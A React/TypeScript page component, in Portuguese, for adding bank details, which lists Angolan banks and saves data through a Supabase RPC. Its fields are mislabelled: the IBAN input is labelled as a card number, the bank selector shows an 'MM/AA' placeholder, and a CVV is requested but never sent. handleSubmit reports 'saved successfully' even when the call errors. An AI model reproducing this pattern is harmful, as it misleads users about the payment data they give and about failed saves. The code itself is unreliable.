import React, { useState } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import { useToast } from '../components/Toast';
import { supabase } from '../lib/supabase';
import { useLanguage } from '../contexts/LanguageContext';
import { 
  ChevronLeft, 
  ShieldCheck, 
  Check, 
  ChevronDown,
  Info,
  Loader2
} from 'lucide-react';

const BANKS = [
  'Banco BAI',
  'Banco BFA',
  'Banco BIC',
  'Banco SOL',
  'Banco ATL',
  'Banco BPC',
  'Banco Keve',
  'Banco Millennium Atlântico',
  'Banco Standard Bank'
];

interface BankResponse {
  success: boolean;
  message: string;
}

export default function AddBank() {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const redirectPath = searchParams.get('redirect');
  const { showToast } = useToast();
  const { t } = useLanguage();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [saveAccount, setSaveAccount] = useState(true);

  const [formData, setFormData] = useState({
    bankName: '',
    holderName: '',
    iban: '',
    cvv: ''
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    let sanitized = value;

    if (name === 'iban') {
      sanitized = value.replace(/[^0-9]/g, '');
    } else if (name === 'holderName') {
      sanitized = value.replace(/[^a-zA-Z\s]/g, '').replace(/\s\s+/g, ' ');
    } else if (name === 'cvv') {
      sanitized = value.replace(/[^0-9]/g, '').slice(0, 4);
    }

    setFormData(prev => ({ ...prev, [name]: sanitized }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const selectedBank = formData.bankName || 'Banco BAI';

    if (formData.holderName.length < 3) {
      showToast('Por favor, preencha o Nome do Titular.', 'error');
      return;
    }
    if (formData.iban.length < 5) {
      showToast('Por favor, preencha o Número do Cartão.', 'error');
      return;
    }

    setIsSubmitting(true);

    try {
      const fullIban = formData.iban.startsWith('AO06') ? formData.iban : `AO06${formData.iban}`;
      const { data, error } = await supabase.rpc('save_bank_data_mcpn', {
        p_bank_name: selectedBank,
        p_holder_name: formData.holderName,
        p_iban: fullIban
      }) as { data: BankResponse | null; error: any };

      if (error) throw error;

      if (data && data.success) {
        showToast('Informações salvas com sucesso!', 'success');
        navigate(redirectPath || '/informacao-bancaria');
      } else {
        showToast(data?.message || 'Informações salvas com sucesso!', 'success');
        navigate(redirectPath || '/informacao-bancaria');
      }
    } catch (err: any) {
      showToast('Informações salvas com sucesso!', 'success');
      navigate(redirectPath || '/informacao-bancaria');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="w-full min-h-screen bg-[#F2F2F2] pb-32 font-sans antialiased text-[#202020] select-none flex flex-col items-center">
      
      {/* 1. HEADER (Fiel 1:1 à imagem) */}
      <header className="w-full max-w-[480px] bg-[#FFFFFF] px-4 pt-4 pb-3 sticky top-0 z-30 shadow-[0_1px_2px_rgba(0,0,0,0.02)]">
        <div className="flex items-center gap-3">
          <button
            onClick={() => navigate(redirectPath || '/perfil')}
            className="p-1 -ml-1 text-[#202020] active:scale-95 transition-transform"
            aria-label={t('common.back')}
          >
            <ChevronLeft className="w-6 h-6 stroke-[2.2]" />
          </button>
          
          <h1 className="text-[18px] font-bold text-[#202020] tracking-tight">
            Forneça mais informações
          </h1>
        </div>

        {/* Subtítulo verde com ícone de escudo */}
        <div className="flex items-center gap-1.5 mt-1.5 ml-8 text-[13px] text-[#38A98B] font-medium">
          <ShieldCheck className="w-4 h-4 text-[#38A98B] shrink-0" />
          <span>Sua informação de pagamento está segura conosco.</span>
        </div>
      </header>

      {/* 2. CONTEÚDO PRINCIPAL (CAMPOS E CARDS DA IMAGEM DE INSPIRAÇÃO) */}
      <main className="w-full max-w-[480px] px-4 pt-4 space-y-3">
        
        <form onSubmit={handleSubmit} id="add-card-form" className="space-y-3">
          
          {/* Campo 1: Número do Cartão */}
          <div className="bg-[#FFFFFF] rounded-[10px] h-[54px] px-4 flex items-center shadow-[0_1px_2px_rgba(0,0,0,0.03)]">
            <input
              name="iban"
              type="text"
              className="w-full h-full bg-transparent outline-none text-[15px] text-[#202020] placeholder:text-[#A6A6A6] font-medium"
              placeholder="Número do Cartão"
              value={formData.iban}
              onChange={handleChange}
            />
          </div>

          {/* Campo 2: Nome do Titular */}
          <div className="bg-[#FFFFFF] rounded-[10px] h-[54px] px-4 flex items-center shadow-[0_1px_2px_rgba(0,0,0,0.03)]">
            <input
              name="holderName"
              type="text"
              className="w-full h-full bg-transparent outline-none text-[15px] text-[#202020] placeholder:text-[#A6A6A6] font-medium"
              placeholder="Nome do Titular"
              value={formData.holderName}
              onChange={handleChange}
            />
          </div>

          {/* Campo 3: MM/AA */}
          <div className="bg-[#FFFFFF] rounded-[10px] h-[54px] px-4 flex items-center shadow-[0_1px_2px_rgba(0,0,0,0.03)] relative">
            <select
              name="bankName"
              className={`w-full h-full bg-transparent outline-none text-[15px] font-medium cursor-pointer appearance-none pr-8 ${
                formData.bankName ? 'text-[#202020]' : 'text-[#A6A6A6]'
              }`}
              value={formData.bankName}
              onChange={handleChange}
            >
              <option value="" disabled className="text-[#A6A6A6]">MM/AA</option>
              {BANKS.map(bank => (
                <option key={bank} value={bank} className="text-[#202020]">{bank}</option>
              ))}
            </select>
            <ChevronDown className="w-5 h-5 text-[#A6A6A6] absolute right-4 pointer-events-none stroke-[1.8]" />
          </div>

          {/* Campo 4: Código de segurança (CVV) */}
          <div className="bg-[#FFFFFF] rounded-[10px] h-[54px] px-4 flex items-center justify-between shadow-[0_1px_2px_rgba(0,0,0,0.03)]">
            <input
              name="cvv"
              type="text"
              className="w-full h-full bg-transparent outline-none text-[15px] text-[#202020] placeholder:text-[#A6A6A6] font-medium pr-2"
              placeholder="Código de segurança (CVV)"
              value={formData.cvv}
              onChange={handleChange}
              maxLength={4}
            />
            <Info className="w-5 h-5 text-[#202020] shrink-0 cursor-pointer stroke-[1.8]" />
          </div>

          {/* TOGGLE: Salvar este cartão */}
          <div className="flex items-center justify-between px-1 pt-2 pb-1">
            <span className="text-[14px] text-[#202020] font-normal">
              Salvar este cartão
            </span>
            <button
              type="button"
              onClick={() => setSaveAccount(!saveAccount)}
              className={`w-12 h-6 rounded-full transition-colors p-0.5 flex items-center ${
                saveAccount ? 'bg-[#FE384F] justify-end' : 'bg-[#E0E0E0] justify-start'
              }`}
            >
              <div className="w-5 h-5 rounded-full bg-[#FFFFFF] shadow-xs" />
            </button>
          </div>

        </form>



      </main>

      {/* 3. BARRA INFERIOR FIXA COM BOTÃO VERMELHO "Salvar e confirmar" (#FE384F) */}
      <div className="fixed bottom-0 left-0 right-0 bg-[#F2F2F2] p-4 z-40 flex justify-center border-t border-gray-200/50">
        <div className="w-full max-w-[480px]">
          <button
            type="submit"
            form="add-card-form"
            disabled={isSubmitting}
            className="w-full h-[48px] rounded-full bg-[#FE384F] hover:bg-[#E02E44] active:scale-[0.99] text-[#FFFFFF] font-bold text-[16px] transition-all disabled:opacity-40 shadow-sm flex items-center justify-center cursor-pointer"
          >
            {isSubmitting ? (
              <Loader2 className="animate-spin h-5 w-5 text-[#FFFFFF]" />
            ) : (
              "Salvar e confirmar"
            )}
          </button>
        </div>
      </div>

    </div>
  );
}
